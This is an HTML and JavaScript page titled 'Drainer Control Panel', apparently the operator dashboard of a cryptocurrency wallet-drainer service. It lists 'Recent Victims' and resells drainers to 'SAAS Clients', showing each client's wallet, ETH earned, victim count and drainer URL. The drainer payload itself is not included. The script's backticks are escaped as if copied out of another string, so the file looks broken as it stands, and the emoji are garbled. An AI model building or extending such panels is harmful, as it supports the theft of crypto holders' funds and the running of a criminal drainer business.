<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drainer Control Panel</title>
    <meta http-equiv="refresh" content="300">
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; padding: 20px; margin: 0; }
        h1 { color: #222; }
        
        /* Tab Navigation */
        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #ddd; }
        .tab { padding: 10px 20px; cursor: pointer; border: 1px solid #ddd; margin-right: 5px; border-radius: 5px 5px 0 0; background: #f0f0f0; }
        .tab.active { background: #fff; border-bottom: 2px solid #fff; margin-bottom: -2px; font-weight: bold; }
        .tab-content { display: none; background: #fff; padding: 20px; border-radius: 0 5px 5px 5px; }
        .tab-content.active { display: block; }
        
        /* SAAS Clients Styles */
        .clients-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; margin-top: 20px; }
        .client-card { background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .client-card h3 { margin: 0 0 10px 0; color: #333; border-bottom: 2px solid; padding-bottom: 5px; }
        .client-info { margin: 10px 0; }
        .client-info div { margin: 5px 0; font-size: 14px; }
        .client-stats { display: flex; justify-content: space-between; margin-top: 10px; padding-top: 10px; border-top: 1px solid #eee; }
        .stat { text-align: center; }
        .stat-value { font-size: 18px; font-weight: bold; color: #4CAF50; }
        .stat-label { font-size: 12px; color: #666; }
        .client-actions { margin-top: 10px; display: flex; gap: 10px; }
        .btn { padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; text-decoration: none; display: inline-block; }
        .btn-primary { background: #007bff; color: white; }
        .btn-success { background: #28a745; color: white; }
        
        /* Existing styles */
        #noDataMsg { font-style: italic; color: #666; }
        ul#victims { list-style: none; padding: 0; }
        ul#victims li { 
            background: #fff; 
            margin-bottom: 10px; 
            padding: 15px; 
            border-radius: 5px; 
            box-shadow: 0 0 5px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); }
        .modal-content { background-color: #fff; margin: 5% auto; padding: 20px; border-radius: 10px; width: 80%; max-width: 800px; max-height: 80vh; overflow-y: auto; }
        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <h1>ðŸš€ Drainer Control Panel</h1>
    
    <!-- Tab Navigation -->
    <div class="tabs">
        <div class="tab active" onclick="switchTab('victims')">ðŸŽ¯ Victims</div>
        <div class="tab" onclick="switchTab('saasClients')">ðŸ›’ SAAS Clients</div>
        <div class="tab" onclick="switchTab('analytics')">ðŸ“Š Analytics</div>
    </div>
    
    <!-- SAAS Clients Tab -->
    <div id="saasClients" class="tab-content">
        <h2>ðŸ›’ SAAS Clients</h2>
        <div id="clientsContainer">
            <p id="noClientsMsg">Loading SAAS clients...</p>
            <div class="clients-grid" id="clientsGrid" style="display: none;"></div>
        </div>
    </div>

    <!-- Victims Tab (Active by default) -->
    <div id="victims" class="tab-content active">
        <h2>ðŸŽ¯ Recent Victims</h2>
        <p id="noDataMsg">No victim data available. Victims will appear here when they interact with your drainers.</p>
        <ul id="victims"></ul>
    </div>

    <!-- Analytics Tab -->
    <div id="analytics" class="tab-content">
        <h2>ðŸ“Š Analytics & Reports</h2>
        <!-- Existing analytics content will go here -->
        <div id="analyticsContent">
            <p>Analytics data will be displayed here.</p>
        </div>
    </div>

    <!-- Rest of your existing modals and scripts -->
    <div id="detailsModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('detailsModal')">&times;</span>
            <div id="modalBody"></div>
        </div>
    </div>

    <script>
        // Tab switching function
        function switchTab(tabName) {
            // Remove active class from all tabs and contents
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            // Add active class to clicked tab and corresponding content
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
            
            // Load data if needed
            if (tabName === 'saasClients') {
                loadSaaSClients();
            }
        }
        
        // Load SAAS clients
        async function loadSaaSClients() {
            try {
                const response = await fetch('/api/saas-clients');
                const data = await response.json();
                
                if (data.success && data.clients.length > 0) {
                    document.getElementById('noClientsMsg').style.display = 'none';
                    const grid = document.getElementById('clientsGrid');
                    grid.style.display = 'grid';
                    grid.innerHTML = '';
                    
                    data.clients.forEach(client => {
                        const card = document.createElement('div');
                        card.className = 'client-card';
                        card.innerHTML = \`
                            <h3 style="border-bottom-color: \${client.themeColor}">\${client.projectName}</h3>
                            <div class="client-info">
                                <div><strong>ID:</strong> \${client.clientId}</div>
                                <div><strong>Wallet:</strong> \${client.wallet.substring(0, 8)}...</div>
                                <div><strong>Registered:</strong> \${client.registrationDate}</div>
                            </div>
                            <div class="client-stats">
                                <div class="stat">
                                    <div class="stat-value">\${client.totalEarnings}</div>
                                    <div class="stat-label">ETH Earned</div>
                                </div>
                                <div class="stat">
                                    <div class="stat-value">\${client.victimCount}</div>
                                    <div class="stat-label">Victims</div>
                                </div>
                            </div>
                            <div class="client-actions">
                                <a href="\${client.drainerUrl}" target="_blank" class="btn btn-primary">Drainer URL</a>
                                <a href="\${client.dashboardUrl}" target="_blank" class="btn btn-success">Dashboard</a>
                            </div>
                        \`;
                        grid.appendChild(card);
                    });
                } else {
                    document.getElementById('noClientsMsg').textContent = 'No SAAS clients registered yet.';
                }
            } catch (error) {
                console.error('Error loading SAAS clients:', error);
                document.getElementById('noClientsMsg').textContent = 'Error loading clients. Check console.';
            }
        }
        
        // Your existing modal functions
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        
        // Initialize - load victims by default
        document.addEventListener('DOMContentLoaded', function() {
            // Your existing initialization code here
            switchTab('victims');
        });
    </script>
    
    <!-- Your existing scripts will continue here -->
    <script>
        // Your existing victim loading and analytics scripts
        // They will still work in their respective tabs
    </script>
</body>
</html>
